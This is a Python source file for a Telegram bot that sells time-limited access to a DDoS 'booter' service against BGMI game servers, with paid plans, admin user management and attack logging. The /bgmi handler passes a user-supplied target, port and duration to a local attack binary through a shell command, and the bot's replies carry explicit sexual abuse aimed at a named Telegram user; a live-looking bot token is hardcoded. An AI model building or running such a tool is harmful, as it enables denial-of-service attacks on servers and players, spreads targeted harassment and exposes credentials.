import telebot
import subprocess
import datetime
import os
import time
from telebot import types

# Insert your Telegram bot token here
bot = telebot.TeleBot('7877126466:AAH6lNFpehRtrqV7pU4Gl2hHV5UNupLLsfo')

# Admin user IDs
admin_id = {"1174779637"}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store feedback
FEEDBACK_FILE = "feedback.txt"

# File to store banned users
BANNED_FILE = "banned.txt"

# Cooldown time in seconds
COOLDOWN_TIME = 50

# Dictionary to store last attack time for each user
last_attack_time = {}

# Dictionary to store banned users and their unban time
banned_users = {}

# Dictionary to store custom attack times set by admin
custom_attack_times = {}

def create_main_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('/bgmi')
    btn2 = types.KeyboardButton('/mylogs')
    btn3 = types.KeyboardButton('/myinfo')
    btn4 = types.KeyboardButton('/feedback')
    btn5 = types.KeyboardButton('/help')
    btn6 = types.KeyboardButton('/rules')
    btn7 = types.KeyboardButton('/plan')
    btn8 = types.KeyboardButton('/start')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8)
    if str(message.chat.id) in admin_id:
        admin_btn1 = types.KeyboardButton('/add')
        admin_btn2 = types.KeyboardButton('/remove')
        admin_btn3 = types.KeyboardButton('/allusers')
        admin_btn4 = types.KeyboardButton('/logs')
        admin_btn5 = types.KeyboardButton('/clearlogs')
        admin_btn6 = types.KeyboardButton('/broadcast')
        admin_btn7 = types.KeyboardButton('/settime')
        markup.add(admin_btn1, admin_btn2, admin_btn3, admin_btn4, admin_btn5, admin_btn6, admin_btn7)
    return markup

def read_banned_users():
    try:
        with open(BANNED_FILE, "r") as file:
            for line in file.read().splitlines():
                if line.strip():
                    user_id, unban_time_str = line.split("|")
                    banned_users[user_id] = datetime.datetime.strptime(unban_time_str, "%Y-%m-%d %H:%M:%S")
    except FileNotFoundError:
        pass

def save_banned_users():
    with open(BANNED_FILE, "w") as file:
        for user_id, unban_time in banned_users.items():
            file.write(f"{user_id}|{unban_time.strftime('%Y-%m-%d %H:%M:%S')}\n")

def is_user_banned(user_id):
    if user_id in banned_users:
        if datetime.datetime.now() >= banned_users[user_id]:
            del banned_users[user_id]
            save_banned_users()
            return False
        return True
    return False

def ban_user(user_id, ban_minutes=25):
    banned_users[user_id] = datetime.datetime.now() + datetime.timedelta(minutes=ban_minutes)
    save_banned_users()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()
read_banned_users()

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Log pahale hee saaf kar die gae hain. daata praapt nahin hua ."
            else:
                file.truncate(0)
                response = "log saaf ho gae "
    except FileNotFoundError:
        response = "Saaf karane ke lie koee Log nahin mila."
    return response

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def record_feedback(user_id, feedback):
    with open(FEEDBACK_FILE, "a") as file:
        file.write(f"UserID: {user_id} | Time: {datetime.datetime.now()} | Feedback: {feedback}\n")

def check_feedback(user_id):
    try:
        with open(FEEDBACK_FILE, "r") as file:
            for line in file.read().splitlines():
                if f"UserID: {user_id}" in line:
                    return True
        return False
    except FileNotFoundError:
        return False

user_approval_expiry = {}

def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)
    else:
        return False

    user_approval_expiry[user_id] = expiry_date
    return True

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Thik se daal bsdk. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response, reply_markup=create_main_keyboard())
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")

                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} ."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists ."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add ."
    else:
        response = "Mood ni hai abhi pelhe purchase kar isse:- @HMSahil9."
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f" Your Info:\n\n User ID: {user_id}\n Username: {username}\n Role: {user_role}\n Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML", reply_markup=create_main_keyboard())

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully ."
            else:
                response = f"User {user_to_remove} not found in the list ."
        else:
            response = '''Please Specify A User ID to Remove.
Usage: /remove '''
    else:
        response = "Purchase karle bsdk:- @HMSahil9 ."
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Log pahale hee saaf kar die gae hain. daata praapt nahin hua ."
                else:
                    file.truncate(0)
                    response = "log saaf ho gae "
        except FileNotFoundError:
            response = "Saaf karane ke lie koee Log nahin mila ."
    else:
        response = "BhenChod Owner na HAI TU LODE."
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "KOI DATA NHI HAI "
        except FileNotFoundError:
            response = "KOI DATA NHI HAI "
    else:
        response = "BhenChod Owner na HAI TU LODE."
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file, reply_markup=create_main_keyboard())
            except FileNotFoundError:
                response = "KOI DATA NHI HAI ."
                bot.reply_to(message, response, reply_markup=create_main_keyboard())
        else:
            response = "KOI DATA NHI HAI "
            bot.reply_to(message, response, reply_markup=create_main_keyboard())
    else:
        response = "BhenChod Owner na HAI TU LODE."
        bot.reply_to(message, response, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

def start_bgmi_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"CHUDAI start : {target}:{port} for {time}\nSEC jab tak @Riyahacksyt ki mummy chut rahi hai koi nai chodega pele iss ki mummy ko ritik pregnant kare ga"
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

bgmi_running = False

@bot.message_handler(commands=['settime'])
def set_attack_time(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            command = message.text.split()
            if len(command) == 2:
                max_time = int(command[1])
                if max_time > 0:
                    custom_attack_times['max_time'] = max_time
                    response = f"Maximum attack time set to {max_time} seconds"
                else:
                    response = "Please provide a positive integer"
            else:
                response = "Usage: /settime <seconds>"
        except ValueError:
            response = "Please provide a valid integer"
    else:
        response = "Admin command only"
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    global bgmi_running

    user_id = str(message.chat.id)
    
    if is_user_banned(user_id):
        unban_time = banned_users[user_id].strftime("%Y-%m-%d %H:%M:%S")
        response = f"You are banned until {unban_time} for not providing feedback"
        bot.reply_to(message, response, reply_markup=create_main_keyboard())
        return
        
    if user_id in allowed_user_ids:
        if bgmi_running:
            response = "abhi @Riyahacksyt ki mummy chodne mein Biji hai thodi der Ruk Ja fir Teri Bari Hai chodne ki."
            bot.reply_to(message, response, reply_markup=create_main_keyboard())
            return
            
        # Check cooldown
        current_time = time.time()
        if user_id in last_attack_time and (current_time - last_attack_time[user_id]) < COOLDOWN_TIME:
            remaining_time = COOLDOWN_TIME - int(current_time - last_attack_time[user_id])
            response = f"Please wait {remaining_time} seconds before launching another attack."
            bot.reply_to(message, response, reply_markup=create_main_keyboard())
            return
            
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time_attack = int(command[3])
            
            max_allowed_time = custom_attack_times.get('max_time', 181)
            if time_attack > max_allowed_time:
                response = f"Error: Maximum attack time is {max_allowed_time} seconds. Buy From @HMSahil9 For More Time"
                bot.reply_to(message, response, reply_markup=create_main_keyboard())
                return
                
            bgmi_running = True
            try:
                record_command_logs(user_id, '/bgmi', target, port, time_attack)
                log_command(user_id, target, port, time_attack)
                start_bgmi_reply(message, target, port, time_attack)
                
                # Simulate bgmi process
                full_command = f"./RAJ {target} {port} {time_attack}"
                subprocess.run(full_command, shell=True)
                
                response = "bgmi Ritik ne chot ke fek diya @Riyahacksyt isski mummy ko."
                last_attack_time[user_id] = current_time
                
                # Request feedback
                bot.reply_to(message, "Please send a screenshot as feedback within 5 minutes using /feedback to avoid being banned", reply_markup=create_main_keyboard())
                
                # Schedule feedback check
                def check_feedback_later(chat_id):
                    time.sleep(300)  # 5 minutes
                    if not check_feedback(user_id):
                        ban_user(user_id)
                        bot.send_message(chat_id, "You have been banned for 25 minutes for not providing feedback", reply_markup=create_main_keyboard())
                
                import threading
                threading.Thread(target=check_feedback_later, args=(message.chat.id,)).start()
                
            except Exception as e:
                response = f"Error during bgmi: {str(e)}"
            finally:
                bgmi_running = False
        else:
            response = "Usage: /bgmi <target> <port> <time>"
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['feedback'])
def handle_feedback(message):
    user_id = str(message.chat.id)
    if message.photo:
        # Get the largest available photo
        file_id = message.photo[-1].file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Save the screenshot
        screenshot_path = f"feedback_{user_id}_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
        with open(screenshot_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        record_feedback(user_id, "Screenshot provided")
        response = "Thank you for your screenshot feedback!"
    else:
        response = "Please provide a screenshot as feedback. Send an image after using /feedback command."
    
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command ."
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''
/bgmi : BGMI WALO KI MAA KO CHODO.
/rules : GWAR RULES PADHLE KAM AYEGA !!.
/mylogs : SAB CHUDAI DEKHO.
/plan : SABKE BSS KA BAT HAI.
/myinfo : APNE PLAN KI VEDHTA DEKHLE LODE.
/feedback : Provide feedback after attack

To See Admin Commands:
/admincmd : Shows All Admin Commands.

Buy From :- @HMSahil9
Official Channel :- https://t.me/bgmikachodna
'''
    bot.reply_to(message, help_text, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''Ritikxyx ke lavde pe @Riyahacksyt ki mummy ka swagat hai.
Try To Run This Command : /help
BUY :-@HMSahil'''
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules :

1. Provide feedback after each attack using /feedback
2. Dont Run Too Many bgmis !! Cause A Ban From Bot
3. Dont Run 2 bgmis At Same Time Becz If U Then U Got Banned From Bot
4. MAKE SURE YOU JOINED https://t.me/bgmikachodna OTHERWISE NOT WORK
5. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Ye plan hi kafi hai bgmi ki ma chodne ke liye!!:

Vip :
-> bgmi Time : (S)

After bgmi Limit :10 sec
-> Concurrents bgmi : 5

Pr-ice List :
Day-->80 Rs
3Day-->200 Rs
Week-->400 Rs
Month-->1500 Rs
'''
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

/add : Add a User.
/remove Remove a User.
/allusers : Authorised Users Lists.
/logs : All Users Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.
/clearusers : Clear The USERS File.
/settime : Set maximum attack time
'''
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
            for user_id in user_ids:
                try:
                    bot.send_message(user_id, message_to_broadcast, reply_markup=create_main_keyboard())
                except Exception as e:
                    print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users ."
        else:
            response = " Please Provide A Message To Broadcast."
    else:
        response = "BhenChod Owner na HAI TU LODE."
    bot.reply_to(message, response, reply_markup=create_main_keyboard())

# Start the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(10)